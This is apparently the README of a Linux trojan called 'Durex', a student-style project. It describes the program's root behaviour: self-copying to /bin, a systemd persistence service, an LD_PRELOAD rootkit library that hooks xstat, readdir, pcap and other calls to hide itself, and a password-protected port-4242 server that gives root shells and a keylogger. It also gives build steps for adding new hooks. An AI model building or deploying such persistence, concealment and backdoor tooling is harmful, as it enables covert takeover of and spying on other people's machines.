# DUREX
Simple Trojan

## INFOS
### Le binaire a été testé sur une Debian 9.3.0 64bits.

## INSTALLATION
### As Normal User

```
$> make && ./Durex
JohnDoe
$>
```
At execution, Durex will print the user actually connected.

### As Root
If the user is root, Durex will:

+ Create a copy of himself in /bin
+ Create a durex.service file in /lib/systemd/ to add himself as a service, launching himslef at bootime as a deamon
+ Create a durex.so library in /usr/local/lib/ to hide himself and his functions from the system
+ Add this library in /etc/ld.so.preload
+ Create a Durex.log file in /var/log/

Only one instance of Durex is created.

+ Durex opens a server on port 4242, allowing 3 clients to connect to it
+ The server is locked by a password
+ The server offers to the clients:
	+ A shell as root
	+ A remote shell as root
	+ A keylogger

## MODIFICATION
### Password generation
+ Generate a new password with the 'pass' executable:
```
$> make pass
cc -o pass other/passwd.c srcs/encrypt.c -I includes/
$> ./pass toto
toto (4): 191 248 92 67 189 94 197 184
$> ./pass kata
kata (4): 201 121 30 74 3 83 154 250
```
+ Use your best editor to modify **durex.h** :
```c
# define SERVER_PASS .. .. .. .. ..
```

### Add functions to the library

* Créer votre fichier et compiler le
```
gcc -Wall -fPIC -shared -o ./Durex.so [fichier.c] -ldl
```
* Si tout se passe bien, créer le binaire hex et copier l'hexadecimal de votre fichier
```
make hex && ./hex [fichier.c]
```
* AJouter l'hexa affiché dans le fichier includes/main.h et prenant exemple sur ceux deja mis en place :
```
# define DUREX_XSTAT_FILE		"/tmp/xstat.c"
# define DUREX_XSTAT_SRC		"\x23\x64\x65\x66..."
```
* Ajouter enfin vos #define dans le fichier /srcs/library.c en suivant la logique deja mise en place :
```
int				install_library()
{
	char	*const files[] = { "gcc", "-Wall", "-fPIC", "-shared", "-o", DUREX_PROCESSHIDER_LIB,
							 DUREX_FGETS_FILE, DUREX_LXSTAT_FILE, DUREX_NEWFSTATAT_FILE,
							 DUREX_PCAP_FILE, DUREX_READDIR_FILE, DUREX_RECVMSG_FILE,
							 DUREX_RM_FILE, DUREX_XSTAT_FILE,
							 "-ldl", NULL };
	char	*const src[] = { NULL, NULL, NULL, NULL, NULL, NULL,
							 DUREX_FGETS_SRC, DUREX_LXSTAT_SRC, DUREX_NEWFSTATAT_SRC,
							 DUREX_PCAP_SRC, DUREX_READDIR_SRC, DUREX_RECVMSG_SRC,
							 DUREX_RM_SRC, DUREX_XSTAT_SRC };
   ...
}
```
* Redemarez l'exécutable en prenant soin de faire les bonnes manipulations (le binaire est ineffaçable btw !)
```
make rt
```
* Votre fonction est maintenant intégré au binaire

#### ATTENTION
Toute fonction intégrée à la librairie sera exécuter sur tous les binaires utilisant cette même fonction.
Par exemple:
La librairie actuelle modifie le comportement de l'appel système xstat(...), du coup tous les binaires utilisant xstat (ls, find, grep, etc.) utiliseront votre fonction.

# AUTEUR
* gbourgeo
